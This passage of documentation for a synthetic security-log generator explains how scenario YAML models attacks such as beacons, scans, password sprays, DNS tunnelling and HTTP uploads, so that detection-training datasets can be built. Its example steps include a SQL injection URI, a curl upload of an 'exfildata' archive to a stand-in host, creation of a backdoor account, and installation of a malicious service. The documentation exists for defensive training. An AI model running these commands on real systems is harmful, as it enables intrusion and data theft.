Red herrings are separate from `baseline_activity.suspicious_noise`, which auto-generates ambient suspicious patterns (after-hours logins, suspicious CLI, failed logon bursts, etc.) without explicit scenario configuration.

### Causal Expansion

The generation engine automatically emits prerequisite events for certain event types. You do **not** need to manually specify these — they are generated with realistic timing offsets from `config/activity/timing_profiles.yaml`:

| Trigger Event | Auto-Generated Prerequisites | Timing |
|---|---|---|
| `connection` (TCP, not port 53) | DNS query (UDP/53) for destination hostname through the DNS lookup bundle; may include source-native resolver companion questions | `network.dns_before_tcp` profile before |
| `logon` (Kerberos auth, Windows, not on DC) | Kerberos TGT (4768) + TGS (4769) on DC | `auth.kerberos_before_logon` profile before. Elevated-session 4672 is emitted with the target-host 4624. |
| `rdp_session` | DNS query + connection (port 3389) + logon (type 10) | Connection at event time, target logon after source-visible transport evidence |
| `ssh_session` | DNS query + canonical connection (port 22) + syslog auth | Connection at event time |
| `process` (with admin commands) | Supplementary audit events (4720, 4726, 4728, 4697, 4698, 1102) inferred from command-line patterns | `windows.audit_from_admin_command` profile after |
| `create_remote_thread` (targeting lsass) | Process access (Sysmon Event 10) | `process.remote_thread_lsass_access` profile before |

**When to manually specify these events:** Only when they are part of the attack narrative itself (e.g., DNS tunneling exfiltration, Kerberos golden ticket forging, explicit credential dumping via process access). The validator will warn if it detects potentially redundant manual specifications.

### Baseline Realism Features

The generation engine automatically provides several layers of realism in baseline activity:

**Hawkes temporal model:** User baseline events use a self-exciting Hawkes process — activity naturally clusters into bursts that taper off, producing realistic human work patterns. Parameters are derived from persona `risk_profile` (high = intense bursts, low = gentle clusters). System/service traffic uses periodic intervals with small jitter instead.

**Storyline child-event spacing:** Events within a multi-event storyline step
default to human typing rhythm (~1.5s between actions, occasional 3-12s
thinking pauses) instead of sharing a single timestamp. Set `event_spacing` on
the parent storyline or red-herring step when the child events should look
automated, interval-driven, or explicitly minutes/hours apart.

**Day-of-week variation:** Scenarios spanning multiple days show weekly rhythm — Monday login storms, Friday early departures, near-zero weekend activity (only sysadmin/security_analyst/help_desk personas active on Saturday/Sunday).

**Stale account evidence:** Stale accounts defined in `environment.stale_accounts` generate not just failed logons but also Kerberos pre-auth failures (4771, status 0x12) on DCs, scheduled task failures (batch logon type 4), and service startup failures (service logon type 5, first hour only).

**Legitimate lateral movement:** 26 patterns of inter-server traffic are auto-generated based on the environment topology. These include backup agents, monitoring, AD replication, application-to-database connections, config management, and more. Patterns are conditional on having the required infrastructure (assign `roles` like `file_server`, `database`, `web_server`, `mail_server`, `print_server`, `dns_server`, `nfs_server` on systems to enable specific patterns).

**Compiled world model:** Before generation starts, the engine compiles authoritative host and user capabilities from `primary_system`, `assigned_user`, `roles`, and `services`. That model is then used to place user activity, choose realistic SSH/RDP/network session types, and keep baseline/storyline session bootstrap behavior aligned. Correlated multi-event activities route through action bundles so storyline, baseline, red-herring, and scanner/noise intent share the same lifecycle and evidence semantics. Successful logons, failed logons, logoffs, service logons, machine-account logons, anonymous logons, NTLM validation, and workstation lock/unlock evidence use internal auth/session bundles so scenario authors can describe normal typed auth events while the generator owns session IDs, lock state, source endpoints, validation evidence, and termination ordering. DC-side Kerberos ticket evidence uses the internal Kerberos/DC bundle so TGT/TGS timing, source IP/port, TGT cache behavior, and service-principal identity stay aligned. Windows audit/account-management events use internal Windows audit bundles so subject session ownership, target identity, source timing, and Sysmon/eCAR process-access context stay aligned. Connections use the internal network-connection bundle so `connection`, `beacon`, scanner/probe, proxy, firewall, IDS, EDR/eCAR FLOW, DNS, TLS, HTTP, and Windows WFP evidence share one source/destination tuple and visibility decision.

**Network-level red herrings:** The suspicious noise generator includes network-layer patterns: high-entropy DNS queries (CDN subdomains, DoH providers), unusual outbound connections (cloud backup sync, dev tool endpoints), and scheduled vulnerability scan overlaps. Controlled by `baseline_activity.suspicious_noise` level.

The target pools behind those ambient network red herrings live in
`activity/suspicious_benign.yaml`. If a scenario needs a specific malicious or
benign IP/domain, author it explicitly in the scenario; config identity pools
are only fallback/background data.

**Entity lifecycle validation:** The engine validates that process injection events target existing PIDs and that event timestamps don't precede system boot times. Warnings are logged for impossible sequences.

**Process→network correlation:** Baseline processes that normally generate network traffic (browsers, Office, dev tools, DB clients) automatically emit corresponding connections (HTTPS, SQL, SSH) 50-500ms after process creation, with the process PID carried for cross-source correlation.

**Storyline process+connection pairing:** When a storyline process command line references a domain (e.g., `Invoke-WebRequest -Uri 'https://cdn-assets-update.com/...'`), pair it with a `connection` event that sets `hostname` to ensure the domain appears in DNS, SSL, HTTP, and proxy logs. The `hostname` field on `connection` and `beacon` events should be the client-facing DNS name the endpoint actually resolved and sent in HTTP Host, TLS SNI, or proxy CONNECT metadata. Avoid reverse-DNS/PTR artifacts or provider-generated infrastructure names unless the scenario intentionally models the client using that name. Omit `hostname` for raw-IP C2 (no DNS lookup expected). For realism-bound generated datasets, avoid using reserved documentation domains (`example.com`, `example.net`, `example.org`) as live public infrastructure; use a scenario-owned lab domain or realistic non-reserved domain when public resolver answers and certificates should appear. The validator will warn about unmatched domains.

**NTP time synchronization:** In AD environments, all domain-joined workstations sync NTP from the domain controller (W32Time service), not from external NIST servers. NTP stratum is stable per server — a DC serving as NTP always reports the same stratum value. External NTP servers are only used for non-domain environments.

**Multi-sensor timing realism:** When multiple Zeek sensors observe the same connection, each sensor's records use the network sensor timing profile in `config/activity/timing_profiles.yaml`. The default distributed-tap profile keeps stable per-sensor clock skew within roughly -18 to +22 ms and per-flow path/capture delay within 1.2 to 58 ms. Byte and packet counts remain canonical unless sensor observation variance is explicitly allowed for that source-native row. Endpoint sources use host-clock profiles instead of these network-sensor appliance clocks.

**Linux syslog depth:** Linux hosts generate 18 categories of syslog messages: SSH login/key exchange (70% key / 30% password), package management, systemd timer execution, logrotate detail, sparse journald housekeeping, plus systemd lifecycle, cron, UFW, logind, and more. Distro-aware (Ubuntu vs RHEL) with appropriate daemon names and paths. Journald capacity/vacuum/rotation rows are emitted as low-frequency host housekeeping episodes, and polkit GUI authentication-agent messages are limited to desktop-capable Linux hosts; server-side polkit authorization remains rare and tied to plausible service/package actions.

**Command diversification:** Baseline process commands are parameterized with varied project paths, document names, build configurations, and per-user file references instead of fixed strings.

**Realistic process trees:** Parent-child relationships are driven by `spawn_rules.yaml`, which defines valid parent processes for each child executable. CLI tools (dotnet.exe, git.exe, npm.exe, etc.) are parented from shells (cmd.exe, powershell.exe), GUI apps from explorer.exe, and system services from services.exe/svchost.exe. Remote/admin Windows commands add an execution-family resolver above generic parent selection, so DC utilities use concrete owners such as live PsExec services, WMI, Task Scheduler, SCM/service context, or PowerShell/WinRM when those families can be inferred. When a valid parent doesn't exist in the user's process history, the engine auto-creates the intermediate chain with realistic timing. Linux processes follow sshd→bash→command chains. Sysmon Event 1 `ParentCommandLine` is populated from the parent process's actual command line (no longer always "-").

**Endpoint ProcessAccess realism:** Sysmon Event 10 and eCAR PROCESS OPEN rows use canonical `ProcessAccessContext` owned by the generation bundle. Source images such as Defender, CSRSS, services, svchost, WMI, and suspicious tools select source-aware CallTrace palettes from package config; scenario authors do not need to set call traces in YAML.

**PID allocation:** Windows PIDs use a lognormal distribution for gap sizes (mu=1.2, sigma=0.8), producing mostly small gaps with an occasional heavy tail — simulating background process churn consuming PIDs between emitted events. Linux PIDs use a similar but tighter distribution (mu=0.5, sigma=0.6). No fixed choice-set fingerprint.

**Per-user bash history:** Baseline SSH sessions to Linux servers generate organic admin commands (ls, df -h, ps aux, systemctl status, etc.) for realistic admin users, creating per-user `<username>.bash_history` files on all Linux hosts. Storyline process events on Linux inject 0-3 organic noise commands around each attack command for realistic interleaving. The generator coordinates bash-history timing with foreground process telemetry through an internal Linux shell-command bundle; scenario authors still use normal `process` events and do not need to model the bundle directly.

### DHCP Lease Events

Use `dhcp_lease` for rogue or new devices appearing on the network (e.g., attacker plugging in a device during physical access, or a compromised host requesting a new IP).

```yaml
- time: "+5m"
  actor: attacker
  system: ROGUE-LAPTOP
  activity: "Rogue device obtains IP via DHCP"
  events:
    - type: dhcp_lease
      mac_address: "00:50:56:a1:b2:c3"
      requested_ip: "10.10.10.99"
      technique: "T1200 - Hardware Additions"
```

Both `mac_address` and `requested_ip` are optional — the engine auto-generates a MAC (using diversified OUI prefixes from `network_params.yaml`) from the system IP and uses the system's configured IP if omitted. DHCP acquisition and renewal are modeled internally as a DHCP lease action bundle: one lease identity drives Zeek DHCP/conn fan-out, lease metadata, link-local visibility, and Linux `dhclient` syslog companions. DHCP broadcast is link-local in the generator: it appears on SPAN-style Zeek sensors monitoring the client's segment and does not traverse unrelated TAP/firewall boundaries unless a separate relay/server transaction is modeled.

### Port Scan Events

Use `port_scan` for network reconnaissance, host sweeps, lateral scans, or worm-like propagation. It is modeled internally as a scanner/probe action bundle that expands one storyline step into many canonical connection attempts plus firewall deny/open-service evidence.

```yaml
- time: "+1h"
  actor: attacker
  system: WEB-EXT-01
  activity: "Port scan of server VLAN from compromised DMZ host"
  events:
    - type: port_scan
      target_segment: server_vlan     # Or target_ips: ["10.0.20.1", "10.0.20.2"]
      target_count: 20                # Sample 20 IPs from the segment
      ports: [22, 80, 443, 445, 3389]
      protocol: tcp
      scan_rate: 50                   # 50 connections/second
      technique: "T1046 - Network Service Discovery"
```

Fields: `source_ip` (override scan source; default: uses storyline system IP — useful for external attacker scans). `target_ips` (explicit list) or `target_segment` + `target_count` (sample from CIDR). `ports` (default: [22, 80, 443, 445, 3389]). `protocol` (tcp/udp/icmp). `scan_rate` (connections/second, default: 100).

Denied connections are only visible to sensors on the source side of the firewall. The firewall's `drop_mode` controls whether Zeek sees `S0` (silent drop) or `REJ` (RST response).

### Beacon Events

Use `beacon` for periodic connections — allowed (C2 callbacks through proxy) or denied (firewall-blocked beaconing). Replaces the former `blocked_c2` type.

```yaml
# Allowed beacon through proxy
- time: "+3h"
  actor: attacker
  system: workstation01
  activity: "C2 beacon to attacker infrastructure"
  events:
    - type: beacon
      dst_ip: "45.83.221.30"
      dst_port: 443
      hostname: "cdn-analytics.example.com"
      interval: "5m"
      duration: "7d"
      jitter: 0.2
      action: allow
      profile: http_checkin
      technique: "T1071.001 - Web Protocols"

# Explicit per-beat HTTP variation
- time: "+3h30m"
  actor: attacker
  system: workstation01
  activity: "C2 beacon with rotating tasking paths"
  events:
    - type: beacon
      dst_ip: "45.83.221.30"
      dst_port: 443
      hostname: "api-sync.example.com"
      interval: "90s"
      count: 20
      http_sequence:
        - method: GET
          uri: "/api/v1/checkin?id={host_id}&k={base64url:12}"
        - method: POST
          uri: "/api/v1/task/{campaign_id}/{hex8}"
          orig_bytes: [180, 900]

# Denied beacon (equivalent to former blocked_c2)
- time: "+5h"
  actor: attacker
  system: DC-01
  activity: "Blocked C2 beaconing — firewall denies outbound from DC"
  events:
    - type: beacon
      dst_ip: "45.83.221.30"
      dst_port: 443
      interval: "30m"
      duration: "12h"
      jitter: 0.2
      action: deny
      technique: "T1071.001 - Web Protocols"
```

Timing fields: `start_time` (optional, defaults to parent event time), `interval` (required), one of `end_time`/`duration`/`count` (required), `jitter` (0.0-1.0, default: **0.15** — beacons are deliberately tight). Connection fields: all `connection` fields (dst_ip, dst_port, hostname, service, protocol, method, uri, user_agent, `referrer`, etc.). `profile` selects a behavior-shaped synthetic profile from `config/activity/beacon_profiles.yaml`; bundled profiles model broad check-in/tasking shapes, not live malware IoCs. `http_sequence` cycles explicit per-tick request shapes and can use deterministic URI tokens: `{host_id}`, `{campaign_id}`, `{tick}`, `{hex8}`, `{guid}`, and `{base64url:N}`. Sequence entries may override `method`, `uri`, `user_agent`, `referrer`, `status_code`, `request_body_len`, `request_multipart`, `response_body_len`, `response_multipart`, `orig_bytes`, and `resp_bytes`; byte fields accept either an integer or `[min, max]`, but multipart outer-size assertions must be exact integers. For `hostname`, use the client-facing DNS name used by the beacon, not a reverse-DNS/PTR artifact, unless that is intentionally part of the scenario. `action`: `allow` (default) or `deny`. Set `referrer` to pin the HTTP Referer header for a specific beacon URL (e.g., a phishing page that launched the download). In explicit proxy mode, HTTP/S beacons from hosts routed through a `forward_proxy` traverse the proxy; denied proxyable beacons stop at the proxy and emit proxy-denied CONNECT/GET evidence rather than direct client-to-origin network evidence.

### Correlated IDS attachments

Typed `connection`, `beacon`, `ssh_session`, `rdp_session`, `dhcp_lease`,
`port_scan`, `dns_query`, `dga_queries`, `dns_tunnel`, and `web_scan` events
accept `ids_alerts`, a list of configured SIDs. An
omitted policy inherits the signature's `alert_policy`; `policy: every` replaces
it; an object replaces it with `detection_filter`, `event_filter`, or both.
Tracking is `by_src` or `by_dst`; event-filter types are `limit`, `threshold`,
and `both`; counts and windows are positive integers. The same SID must have one
effective policy throughout a scenario.

```yaml
ids_alerts:
  - sid: 2028401
  - sid: 2002910
    policy:
      detection_filter: {track: by_src, count: 5, seconds: 60}
      event_filter: {type: limit, track: by_src, count: 1, seconds: 300}
```

Attachments assert a match; EvidenceForge does not evaluate the complete Snort
rule predicate. Filtering is per sensor after visibility, timing, and NAT/PAT
projection. Explicit proxies carry candidates on both physical legs where those
legs exist; denials and cache hits do not create origin alerts. Prefer attachments
over raw Snort events for cross-source correlation.

Attachments fan out only to transports owned by the authored event: the SSH/RDP
session connection, the authored DHCP transaction, each scan/web request, or
each authored DNS/DGA/tunnel query. Automatic DHCP renewals and DNS-tunnel cover
traffic do not inherit the assertion. Authored web-scan attachments coexist with
preset alerts and win a same-`(gid, sid)` collision. A tuple without an explicit
or built-in IDS context never alerts. Email transports remain deferred, and IDS
sensors do not decrypt traffic.

### DNS Query Events

Use `dns_query` for standalone DNS lookups with full control over query parameters. Unlike the automatic DNS lookup bundle used for `connection` prerequisites, this type lets you specify exact query type, response code, TTL, and answer. Useful for DNS-based reconnaissance, cache poisoning indicators, or any scenario where the DNS query itself is the story.

```yaml
- time: "+1h"
  actor: marcus.chen
  system: WS-DEV-01
  activity: "DNS reconnaissance — query for mail server"
  events:
    - type: dns_query
      query: "mail.example.com"
      qtype: MX
      rcode: NOERROR
      answer: "10 smtp.example.com"
      technique: "T1018 - Remote System Discovery"
```

Fields:
- `query` (required): Domain name to query
- `qtype` (default: `A`): Query type — `A`, `AAAA`, `TXT`, `CNAME`, `MX`, `NULL`, `SRV`, `PTR`
- `rcode` (default: `NOERROR`): Response code — `NOERROR`, `NXDOMAIN`, `SERVFAIL`, `REFUSED`
- `ttl` (optional): Response TTL (auto-generated if omitted)
- `answer` (required when `rcode=NOERROR`): Response value(s) — string or list of strings
- `source_ip` (optional): Querying host IP (default: storyline system IP)

### Web Scan Events

Use `web_scan` for automated web scanning attacks (Nikto, DirBuster, Gobuster, SQLMap, Nmap HTTP). It is modeled internally as a scanner/probe action bundle that expands one storyline step into scanner-realistic HTTP requests, user agents, status distributions, IDS alerts, and correlated web_access + Zeek HTTP + Zeek conn records.

```yaml
- time: "+3h"
  actor: SYSTEM
  system: WEB-01
  activity: "Nikto scan against web server from external attacker"
  events:
    - type: web_scan
      dst_ip: "10.10.20.10"
      dst_port: 80
      hostname: "portal.example.com"
      source_ip: "104.248.71.33"
      preset: nikto
      rate: 10                        # 10 requests/second
      duration: "15m"
      technique: "T1595.002 - Active Scanning: Vulnerability Scanning"
```

Fields:
- `dst_ip` (required): Target web server IP
- `dst_port` (default: 80): Target port
- `hostname` (optional): Target domain name
- `source_ip` (optional): Override scanner source IP
- `preset` (optional): Scanner preset — `nikto`, `dirb`, `gobuster`, `sqlmap`, `nmap_http`
- `paths` (optional): Custom URI path list — `[{uri: "/admin", method: "GET", status: 403}]`
- `user_agent` (optional): Override the preset's default user agent
- `status_codes` (optional): Override status code distribution (e.g., `{"404": 0.7, "200": 0.2, "403": 0.1}`)
- `rate` (required): Average requests per second. With `duration`/`end_time`, the engine applies deterministic per-campaign throughput drift so repeated scans with the same nominal rate do not produce identical request totals. With explicit `count`, the count remains exact.
- `duration` / `count` / `end_time`: Termination condition (exactly one required)
- `jitter` (default: **0.4**): Timing variation — wide variance reflects real-world latency jitter from target server response times

Either `preset` or `paths` (or both) must be specified.

### Credential Spray Events

Use `credential_spray` for bulk authentication attacks — password spraying, brute force, or credential stuffing. Generates realistic sequences of failed logon events (Windows 4625/4776 or Linux syslog auth failures) with an optional final successful logon.

```yaml
- time: "+2h"
  actor: SYSTEM
  system: DC-01
  activity: "Password spray against domain accounts"
  events:
    - type: credential_spray
      source_ip: "185.220.101.34"
      pattern: spray
      target_accounts: ["marcus.chen", "priya.patel", "sarah.oconnell", "diego.ramirez"]
      logon_type: 3
      interval: "2s"
      duration: "10m"
      success:
        account: "priya.patel"
        after: 8                      # Succeed after 8 failures
      technique: "T1110.003 - Brute Force: Password Spraying"
```

Fields:
- `target_accounts` (required): List of target usernames
- `source_ip` (optional): Attacker source IP
- `pattern` (default: `spray`): Attack pattern — `spray` (one password per account), `brute_force` (many passwords per account), `stuffing` (one-to-one credential pairs)
- `logon_type` (default: 3): Windows logon type for the attempts
- `success` (optional): Final successful logon — `{account: "username", after: N}` where `N` is number of failures before success
- `interval` (required): Time between attempts
- `duration` / `count` / `end_time`: Termination condition (exactly one required)
- `jitter` (default: **0.5**): Timing variation — high default reflects self-pacing behavior to evade lockout policies

### DGA Query Events

Use `dga_queries` for domain generation algorithm (DGA) traffic — algorithmically generated DNS lookups that mostly return NXDOMAIN. Used for botnet/DGA detection training.

```yaml
- time: "+4h"
  actor: SYSTEM
  system: WS-DEV-01
  activity: "DGA beaconing from infected workstation"
  events:
    - type: dga_queries
      interval: "500ms"
      duration: "2h"
      jitter: 0.3
      tld: ".com"
      length_range: [10, 15]
      seed: 42
      rcode_distribution:
        NXDOMAIN: 0.95
        NOERROR: 0.05
      answer_ip: "45.83.221.99"
      technique: "T1568.002 - Dynamic Resolution: Domain Generation Algorithms"
```

Fields:
- `length_range` (default: `[8, 15]`): Min/max domain label length (1-63)
- `charset` (default: lowercase alphanumeric): Character set for domain generation
- `tld` (default: `.com`): Top-level domain suffix
- `seed` (optional): Deterministic seed for reproducible domain sequences
- `rcode_distribution` (optional): Response code probabilities (must sum to ~1.0) — e.g., `{"NXDOMAIN": 0.95, "NOERROR": 0.05}`
- `answer_ip` (required when NOERROR > 0): IP address for successful resolutions
- `source_ip` (optional): Override querying host IP
- `interval` (required): Time between queries
- `duration` / `count` / `end_time`: Termination condition (exactly one required)
- `jitter` (default: **0.3**): Timing variation

### DNS Tunnel Events

Use `dns_tunnel` for data exfiltration via encoded DNS subdomain labels. Generates DNS queries with encoded payload chunks as subdomains (e.g., `aGVsbG8gd29ybGQ.tunnel.evil.com`). Useful for DNS exfiltration detection training.

```yaml
- time: "+6h"
  actor: marcus.chen
  system: WS-DEV-01
  activity: "DNS tunneling exfiltration of stolen credentials"
  events:
    - type: dns_tunnel
      base_domain: "ns1.cdn-analytics.net"
      encoding: base64
      qtype: TXT
      label_length: 30
      payload_size: 512
      interval: "2s"
      duration: "30m"
      jitter: 0.1
      technique: "T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol"
```

Fields:
- `base_domain` (required): Tunnel endpoint domain — encoded chunks become subdomains of this
- `encoding` (default: `hex`): Encoding scheme — `base32`, `base64`, `hex`
- `qtype` (default: `TXT`): DNS query type — `TXT`, `NULL`, `CNAME`
- `label_length` (default: 30): Max length of each encoded subdomain label (1-63)
- `payload` (optional): Fixed payload string to encode and exfiltrate
- `payload_size` (default: 256): Random payload size in bytes if no `payload` specified
- `source_ip` (optional): Override querying host IP
- `interval` (required): Time between queries
- `duration` / `count` / `end_time`: Termination condition (exactly one required)
- `jitter` (default: **0.25**): Timing variation

### HTTP Connection Events

For web-based attack steps (SQL injection, web shell access, etc.), use `connection` with `service: http` and `dst_port: 80` instead of `raw`. This produces **correlated records** across web_access + zeek_http + zeek_conn — a `raw` event only targets one format.

```yaml
- time: "+1h10m"
  actor: attacker
  system: WEB-01
  activity: "SQL injection probe against EHR portal"
  events:
    - type: connection
      dst_ip: "10.10.20.10"
      dst_port: 80
      service: http
      source_ip: "104.248.71.33"
      method: "GET"
      uri: "/ehr/login.php?id=1%27%20OR%201=1--"
      status_code: 200
      user_agent: "Mozilla/5.0 (compatible; Googlebot/2.1)"
```

HTTP optional fields on `connection` events: `method` (GET/POST/etc.), `uri`, `status_code`, `user_agent`, `referrer`, `request_body_len`, `response_body_len`. With `service: http`, the engine generates correlated web_access, zeek_http, zeek_conn, and visible files.log records. `request_body_len` pins the exact transmitted request entity size; originator TCP bytes still include HTTP framing. Every successfully transmitted plaintext request body receives originator-direction Zeek file analysis, including background forms, APIs, telemetry, beacons, and red herrings. Every transmitted nonempty plaintext response entity receives responder-direction analysis, including tiny redirects, authentication failures, and other error bodies. HEAD, 1xx, 204, 205, 304, successful CONNECT, zero-byte, failed-transport, and opaque HTTPS responses remain fileless. Anonymous bodies do not invent endpoint file reads. Both body-length fields are available on `beacon` and `beacon.http_sequence`; sequence values may be exact integers or `[min, max]` ranges.

Request MIME type is derived from the owning activity unless a resolved upload supplies stronger metadata. Curl `--data-binary @path`, `--upload-file path`, `-T path`, and multipart `-F name=@path` resolve a local source file and curl-owned endpoint read. Local source names stay in ground truth and do not become Zeek filenames unless the HTTP message exposes one: raw `--data-binary` has no wire filename, while multipart normally does. Response MIME preserves explicit/application metadata, otherwise follows URI inference, redirect/error `text/html`, then `application/octet-stream`; response URLs never invent filenames. `http_file_profiles.yaml` maps extensions such as `.rar` to `application/vnd.rar`. A plaintext proxy MISS creates leg-local FUIDs for matching origin→proxy and proxy→client content; a HIT or proxy error creates only the client-leg response file. HTTPS stays opaque without modeled decryption.

`request_multipart` and `response_multipart` are available on `connection`,
`beacon`, `beacon.http_sequence`, and application/web-route method profiles. They
accept ordered `multipart/form-data` or `multipart/mixed` parts; repeated names and
nested multipart containers are preserved. A leaf defines exactly one of `value`,
`body_len`, or `local_source_path`, plus optional `filename`, `filename_star`,
`content_type`, `content_type_name`, `detected_mime_type`, `content_length`, and
`transfer_encoding` (`binary`, `7bit`, `8bit`, `base64`, or `quoted-printable`).
Direct form-data parts require `name`. Literal UTF-8 values derive their decoded
size. The engine deterministically generates a client-shaped boundary when it is
omitted and derives the outer body size from the complete serialization. An
authored `request_body_len`/`response_body_len` alongside multipart is an exact
assertion and a mismatch is rejected; profile body-size ranges are mutually
exclusive with multipart.

```yaml
- type: connection
  dst_ip: 45.33.32.30
  dst_port: 80
  hostname: some.site
  service: http
  method: POST
  uri: /uploads/accept-upload
  request_multipart:
    media_type: multipart/form-data
    parts:
      - name: metadata
        value: '{"case":"1234"}'
        content_type: application/json
      - name: archive
        body_len: 44040192
        local_source_path: /tmp/exfildata.rar
        filename: exfildata.rar
        content_type: application/vnd.rar
        detected_mime_type: application/vnd.rar
```

The outer request is larger than 44,040,192 bytes because it includes the
multipart envelope; the matching file row remains exactly 44,040,192 decoded
bytes. Curl `-F`/`--form` and `--form-string` are parsed in order. `@path` emits a
file-backed part and wire filename, `<path` emits a file-backed field without a
filename, and literals emit no endpoint read. `filename=`, `type=`, and `encoder=`
modifiers are honored. More than one unresolved local file size is rejected.
Chunked/content-coded multipart and `multipart/byteranges` are not supported.

```yaml
events:
  - type: process
    process_name: /usr/bin/curl
    command_line: >-
      /usr/bin/curl --data-binary @/tmp/exfildata.rar
      http://some.site/uploads/accept-upload
  - type: connection
    dst_ip: "45.33.32.30"
    dst_port: 80
    hostname: some.site
    service: http
    method: POST
    uri: /uploads/accept-upload
    request_body_len: 44040192
    status_code: 200
```

**Byte and connection state overrides:** `orig_bytes` (originator payload bytes), `resp_bytes` (responder payload bytes), `response_body_len` (HTTP response body bytes rendered in `web_access` / `proxy_access`), `conn_state` (Zeek connection outcome: SF, S0, REJ, etc.). When omitted, the engine auto-sizes bytes based on the event's `technique`, `description`, URI, and HTTP status (exfiltration -> large `orig_bytes`; C2 -> small bidirectional; downloads -> large successful response bodies; 4xx/5xx -> small error pages), and defaults `conn_state` to SF. Set `response_body_len` to pin exact HTTP body bytes; if it is omitted on an HTTP event, explicit `resp_bytes` is also used as the HTTP body-size override before connection-level protocol overhead is added. Set `conn_state` explicitly to model failed connections (e.g., `S0` for a dead C2 channel, `REJ` for a blocked exfil attempt).

### Raw Events

The `raw` event type targets a specific output format with arbitrary field data. Use it **only** for events not covered by the typed event specs above. Prefer typed events (especially `connection` for web access) because `raw` events bypass cross-source correlation — they produce a single log entry with no matching records in other formats.

```yaml
- time: "+2h"
  actor: attacker
  system: WEB-01
  activity: "Custom syslog entry"
  events:
    - type: raw
      target_format: syslog
      fields:
        hostname: WEB-01
        app_name: "apache2"
        pid: 1234
        facility: 3
        severity: 6
        message: "custom message here"
```

`target_format` must be a supported format name (e.g., `syslog`, `windows_event_security`, `ecar`, `zeek_conn`). The `fields` dict is passed directly to the target emitter without schema validation — ensure field names match the format's expected structure. The event's timestamp is automatically injected if not provided in `fields`.

### Correlated Events for Process Commands

When a `process` event declares a command that would produce additional audit events in a real environment, those correlated events should be explicitly declared in the same step's `events` list. This ensures complete, realistic log output regardless of what command is being run.

The table below shows common categories of commands and the correlated event types to declare alongside the `process` event:

| Command Category | Example Commands | Correlated Event Type |
|-----------------|------------------|----------------------|
| Account creation | `net user /add`, `useradd`, `New-ADUser`, `dsadd user` | `account_created` |
| Account deletion | `net user /delete`, `userdel`, `Remove-ADUser` | `account_deleted` |
| Group membership changes | `net group /add`, `net localgroup /add`, `Add-ADGroupMember`, `usermod -aG` | `group_member_added` |
| Service creation | `sc create`, `New-Service`, `systemctl enable` | `service_installed` |
| Scheduled task creation | `schtasks /Create`, `at`, `crontab -e`, `Register-ScheduledTask` | `scheduled_task_created` |
| Log clearing | `wevtutil cl`, `Clear-EventLog`, `rm /var/log/*` | `log_cleared` |
| Process injection | mimikatz `sekurlsa::`, reflective DLL injection, process hollowing | `create_remote_thread` |

This is not an exhaustive list -- any command that would produce a distinct audit trail should have its correlated events declared explicitly.

#### Engine Safety Net

The engine automatically infers correlated events for 6 common Windows command patterns when `supplementary: auto` (the default) is set on a process event:

| Command Pattern | Auto-Inferred Event |
|----------------|---------------------|
| `net user <name> /add` | 4720 (account created) |
| `net user <name> /delete` | 4726 (account deleted) |
| `net group "<group>" <user> /add` | 4728 (group member added) |
| `schtasks /Create /TN "<name>"` | 4698 (scheduled task created) |
| `sc create <name> binPath=` | 4697 (service installed) |
| `wevtutil cl Security` | 1102 (log cleared) |

This safety net catches common cases, but should not be relied upon as the primary mechanism -- always declare correlated events explicitly. If the same event type is already in the `events` list, auto-inference skips it (no duplicates). Set `supplementary: none` to disable auto-inference entirely.

### Best Practices

1. **Always declare the primary action explicitly** -- don't rely on inference for the main event
2. **Declare correlated events for process commands** -- if a command creates an account, installs a service, clears logs, etc., add the corresponding event type to the `events` list
3. **Explicitly declare cross-system events** -- inference cannot generate events on other systems (e.g., DC Kerberos for domain logon, RDP logon on target)
4. **Explicitly declare events when field precision matters** -- auto-inference uses deterministic identity-directory values; declare typed account/identity events when a specific target, group, SID, UID, or account relationship matters to the exercise
5. **Use explicit events for specialized detection types** -- CreateRemoteThread, LSASS access; inference doesn't detect these patterns

### Examples

**Password spray + lateral movement:**
```yaml
- time: "+30m"
  actor: attacker
  system: WS-01
  activity: "Password spray against domain accounts"
  events:
    - type: failed_logon
      source_ip: "185.220.101.34"
    - type: failed_logon
      source_ip: "185.220.101.34"
    - type: logon
      source_ip: "185.220.101.34"
      logon_type: 3
```

**Process with explicit correlated events:**
```yaml
- time: "+1h"
  actor: attacker
  system: DC-01
  activity: "Create backdoor domain account"
  events:
    - type: process
      process_name: "C:\\Windows\\System32\\net.exe"
      command_line: "net user svc-audit P@ss! /add /domain"
    - type: account_created
      target_username: "svc-audit"
```

**Service persistence with correlated audit event:**
```yaml
- time: "+1h15m"
  actor: attacker
  system: WEB-01
  activity: "Install malicious service for persistence"
  events:
    - type: process
      process_name: "C:\\Windows\\System32\\sc.exe"
      command_line: "sc create evilsvc binPath= C:\\Windows\\Temp\\payload.exe start= auto"
    - type: service_installed
      service_name: "evilsvc"
      service_file_name: "C:\\Windows\\Temp\\payload.exe"
```

**Explicit cross-system events:**
```yaml
- time: "+1h30m"
  actor: attacker
  system: WEB-01
  activity: "SSH lateral movement to web server"
  events:
    - type: ssh_session
      source_ip: "10.20.10.13"
```

## Output

```yaml
output:
  logs:
    - format: windows
    - format: zeek
    - format: ecar
  destination: ./output
  compression: false           # Optional (default: false)
```

Supported formats: `windows`, `zeek`, `ecar` (simulated EDR using the eCAR record format), `syslog`, `bash_history`, `snort_alert`, `cisco_asa`, `web_access`, `proxy_access`.

Output formats here are canonical and target-neutral. Choose target-specific
file shapes, such as SOF-ELK® Snare Windows events or year-partitioned RFC3164
syslog, with `eforge generate --target default|sof-elk`; do not encode a parser
target in scenario YAML.

`proxy_access` requires at least one system with `roles: [forward_proxy]`. If it is requested without a forward proxy system, validation warns because no proxy access log file will be generated. When proxy logs are requested, add `environment.proxy.mode` to make transparent vs explicit proxy semantics clear. Current proxy behavior assumes TLS interception, so HTTPS can include CONNECT plus inspected request rows; non-intercepting tunnel-only proxy behavior is deferred.

`zeek` and concrete `zeek_*` outputs require a `type: network` sensor whose
`log_formats` include the requested Zeek format or the `zeek` group.
`snort_alert` requires a `type: ids` sensor with `snort_alert`. `cisco_asa`
requires a `type: firewall` sensor with `cisco_asa`. `proxy_access` is produced
by forward-proxy systems, not by network sensors.

#### Format Filtering

The `output.logs` list can be scoped to only needed formats for faster generation with long time windows. For example, a 30-day baseline exercise that only needs Zeek conn.log can declare just `format: zeek_conn` instead of the full `zeek` group.

The `--formats` CLI flag provides runtime filtering without modifying the scenario YAML. It intersects with `output.logs` — only formats present in both are generated. Group names (`zeek`, `windows`) are expanded before intersection.

## Backward Compatibility

Persona fields are optional with null defaults:
- `expanded_activities`, `work_hours_parsed`, `activity_intensity` default to null
